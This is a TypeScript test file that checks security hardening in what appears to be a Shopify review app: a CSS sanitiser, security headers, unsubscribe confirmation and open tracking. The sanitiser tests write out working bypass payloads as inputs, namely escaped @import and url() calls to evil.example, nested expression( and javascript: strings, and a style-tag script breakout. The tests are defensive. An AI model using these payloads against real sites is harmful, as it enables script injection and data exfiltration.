/**
 * Offline tests for the security controls hardened in the pre-submission sweeps.
 *
 * Each of these had a working bypass. They are here rather than in a comment because a
 * sanitiser, a header policy and a rate limiter all look correct while being wrong — the
 * failure is a string that survives, a header that is missing on one branch, or a counter
 * that resets, and none of those shows up in a typecheck.
 *
 * Run (no runner, no database):
 *
 *   npx --yes bun@latest run tests/security.test.ts
 *
 * The route and middleware modules are imported dynamically, after the environment they
 * read at module load is set. Nothing here touches the database: the one unsubscribe path
 * that writes (a POST with a valid token) is deliberately not exercised.
 */

import assert from 'node:assert';
import { sanitiseCss } from '../src/lib/css-sanitiser';

process.env.NEXTAUTH_SECRET ||= 'security-test-secret';

const { middleware } = await import('../src/middleware');
const { NextRequest } = await import('next/server');
const unsubscribe = await import('../src/app/api/unsubscribe/route');
const { isPageDataFetch } = await import('../src/lib/review-requests');

const tests: Array<[string, () => void | Promise<void>]> = [];
const test = (name: string, fn: () => void | Promise<void>) => tests.push([name, fn]);

// ── CSS sanitiser ───────────────────────────────────────────────────────────────────
//
// CSS resolves `\` escapes while tokenising, so `\75rl(` IS `url(` to a browser. The
// previous implementation matched literal ASCII only, so both of these passed straight
// through the write pass AND the read pass — arbitrary remote CSS on the storefront,
// which is selector-based exfiltration of anything on the product page.

test('escaped @import cannot smuggle a remote stylesheet', () => {
  const out = sanitiseCss('@\\69mport \\75rl(http://evil.example/x.css);');
  assert.ok(!/@import/i.test(out), 'escaped @import survived');
  assert.ok(!/evil\.example/i.test(out), 'remote origin survived');
});

test('escaped url() cannot fetch from a third-party origin', () => {
  const out = sanitiseCss('a{background:\\75rl(http://evil.example/pixel.png)}');
  assert.ok(!/evil\.example/i.test(out));
});

test('a backslash before a plain letter is also an escape', () => {
  assert.ok(!/evil\.example/i.test(sanitiseCss('a{background:\\u\\r\\l(http://evil.example/x)}')));
});

// Single-pass replacement is defeated by nesting: removing the inner token re-forms the
// outer one, so the next stage receives a live keyword it never inspected.
test('nested expression( cannot re-form after one pass', () => {
  assert.ok(!/expression\s*\(/i.test(sanitiseCss('a{width:exprexprexpression(ession(ession(alert(1))}')));
});

test('nested javascript: cannot re-form after one pass', () => {
  assert.ok(!/javascript\s*:/i.test(sanitiseCss('a{background:url(javajavascript:script:alert(1))}')));
});

// The other half of a sanitiser being correct: it must not eat valid input. The optional
// quote group in the old pattern backtracked to empty and rewrote legitimate quoted
// https urls to `none`, silently breaking merchant CSS.
test('quoted https url survives', () => {
  const out = sanitiseCss('.rm-review{background:url("https://cdn.shopify.com/a.png")}');
  assert.ok(out.includes('https://cdn.shopify.com/a.png'), 'legitimate quoted url was destroyed');
});

test('unquoted https and data:image urls survive', () => {
  assert.ok(sanitiseCss('.a{background:url(https://cdn.shopify.com/b.png)}').includes('cdn.shopify.com/b.png'));
  assert.ok(sanitiseCss('.a{background:url(data:image/svg+xml;base64,AAA)}').includes('data:image/svg+xml'));
});

test('ordinary declarations are untouched', () => {
  const css = '.rm-review{box-shadow:0 1px 3px rgba(0,0,0,.08);border-radius:8px}';
  assert.strictEqual(sanitiseCss(css), css);
});

test('plain http is still neutralised', () => {
  const out = sanitiseCss('.x{background:url(http://insecure.example/a.png)}');
  assert.ok(!out.includes('insecure.example'));
  assert.ok(out.includes('none'));
});

test('style breakout remains impossible', () => {
  assert.ok(!sanitiseCss('a{}</style><script>alert(1)</script>').includes('<'));
});

// ── Middleware headers ──────────────────────────────────────────────────────────────
//
// The operator-portal branch returned before the shared hardening ran, so the one page
// that takes the cross-tenant portal password was the one page never told to pin to
// HTTPS. The fix moved the shared headers above the branch; these pin that order.

const headersFor = (url: string) => middleware(new NextRequest(url)).headers;

test('operator portal gets HSTS, nosniff and Referrer-Policy', () => {
  for (const path of ['/admin', '/admin/stores/abc', '/api/admin/stores']) {
    const h = headersFor(`https://app.example.com${path}`);
    assert.strictEqual(h.get('strict-transport-security'), 'max-age=31536000; includeSubDomains', path);
    assert.strictEqual(h.get('x-content-type-options'), 'nosniff', path);
    assert.strictEqual(h.get('referrer-policy'), 'strict-origin-when-cross-origin', path);
  }
});

test('operator portal is never framed and never indexed', () => {
  const h = headersFor('https://app.example.com/admin?shop=pfaagz-zj.myshopify.com');
  assert.strictEqual(h.get('content-security-policy'), "frame-ancestors 'none';");
  assert.strictEqual(h.get('x-robots-tag'), 'noindex, nofollow');
});

test('merchant admin keeps its frame-ancestors and the shared headers', () => {
  const h = headersFor('https://app.example.com/dashboard?shop=pfaagz-zj.myshopify.com');
  assert.strictEqual(
    h.get('content-security-policy'),
    'frame-ancestors https://pfaagz-zj.myshopify.com https://admin.shopify.com;'
  );
  assert.strictEqual(h.get('strict-transport-security'), 'max-age=31536000; includeSubDomains');
  assert.strictEqual(h.get('x-content-type-options'), 'nosniff');
  assert.strictEqual(h.get('referrer-policy'), 'strict-origin-when-cross-origin');
  assert.strictEqual(h.get('x-robots-tag'), null, 'merchant pages must stay indexable');
});

test('an attacker-controlled shop parameter cannot widen the frame allow-list', () => {
  for (const shop of ['evil.example', 'https://evil.example', 'x.myshopify.com evil.example', "'self'"]) {
    const h = headersFor(`https://app.example.com/?shop=${encodeURIComponent(shop)}`);
    assert.strictEqual(h.get('content-security-policy'), 'frame-ancestors https://admin.shopify.com;', shop);
  }
});

// ── Unsubscribe: GET confirms, POST acts ────────────────────────────────────────────
//
// Mail gateways GET every link in a message at delivery time. The route used to suppress
// on GET, so a scanner — not the customer — unsubscribed that address from every store
// on the platform the moment the first invitation arrived.

const validToken = unsubscribe.unsubscribeToken('Someone@Example.com');

test('GET with a valid token renders a confirmation form and suppresses nothing', async () => {
  const res = await unsubscribe.GET(
    new NextRequest(`https://app.example.com/api/unsubscribe?t=${encodeURIComponent(validToken)}`)
  );
  assert.strictEqual(res.status, 200);
  assert.ok((res.headers.get('content-type') || '').startsWith('text/html'));
  const html = await res.text();
  assert.ok(/<form method="POST" action="\/api\/unsubscribe\?t=[^"]+"/.test(html), 'no POST form rendered');
  assert.ok(html.includes(encodeURIComponent(validToken)), 'form does not carry the token back');
  assert.ok(/<button type="submit"[^>]*>Unsubscribe<\/button>/.test(html), 'no Unsubscribe button');
  assert.ok(!/has been removed/i.test(html), 'GET must not claim the address was removed');
  assert.ok(!/example\.com/i.test(html.replace(/app\.example\.com/g, '')), 'address must not appear on the page');
  assert.ok(!/<(img|link|script)\b/i.test(html), 'confirmation page must load no external assets');
});

test('GET with a tampered token is refused without a form', async () => {
  const tampered = validToken.slice(0, -2) + (validToken.endsWith('AA') ? 'BB' : 'AA');
  for (const t of ['', 'junk', tampered]) {
    const res = await unsubscribe.GET(new NextRequest(`https://app.example.com/api/unsubscribe?t=${encodeURIComponent(t)}`));
    assert.strictEqual(res.status, 400, JSON.stringify(t));
    assert.ok(!/<form/i.test(await res.text()), 'invalid token must not get a form');
  }
});

test('POST with an invalid token is refused before anything is written', async () => {
  const res = await unsubscribe.POST(
    new NextRequest('https://app.example.com/api/unsubscribe?t=junk', {
      method: 'POST',
      body: 'List-Unsubscribe=One-Click',
    })
  );
  assert.strictEqual(res.status, 400);
});

test('the token round-trips the normalised address', () => {
  // Two tokens for the same address differ (random IV) but both decrypt to the same thing:
  // the confirmation page for either must lead to the same suppression row.
  const a = unsubscribe.unsubscribeToken('Someone@Example.com');
  const b = unsubscribe.unsubscribeToken('someone@example.com');
  assert.notStrictEqual(a, b);
  assert.ok(/^[A-Za-z0-9_-]+$/.test(a), 'token must be URL-safe without encoding');
});

// ── Review-request open tracking ────────────────────────────────────────────────────
//
// The same scanners GET the review link, and the page's data endpoint stamped openedAt on
// every fetch, so a merchant whose customers sit behind a gateway saw opens that never
// happened. Only the page's own fetch() should count.

test('the page\'s own fetch() counts as an open', () => {
  assert.ok(isPageDataFetch(new Headers({ 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'sec-fetch-site': 'same-origin' })));
});

test('a navigation, a prefetch or a headerless scanner GET does not', () => {
  assert.ok(!isPageDataFetch(new Headers({ 'sec-fetch-mode': 'navigate', 'sec-fetch-dest': 'document' })));
  assert.ok(!isPageDataFetch(new Headers({ 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', 'sec-purpose': 'prefetch' })));
  assert.ok(!isPageDataFetch(new Headers({ 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty', purpose: 'prefetch' })));
  assert.ok(!isPageDataFetch(new Headers({ 'sec-fetch-mode': 'no-cors', 'sec-fetch-dest': 'image' })));
  assert.ok(!isPageDataFetch(new Headers({ 'user-agent': 'Mozilla/5.0 (compatible; scanner)' })));
  assert.ok(!isPageDataFetch(new Headers()));
});

// ── Run ─────────────────────────────────────────────────────────────────────────────
let failed = 0;
for (const [name, fn] of tests) {
  try { await fn(); console.log(`  ok    ${name}`); }
  catch (err) {
    failed++;
    console.log(`  FAIL  ${name}`);
    console.log(`        ${err instanceof Error ? err.message : String(err)}`);
  }
}
console.log(`\n${tests.length - failed}/${tests.length} passed`);
if (failed) process.exit(1);
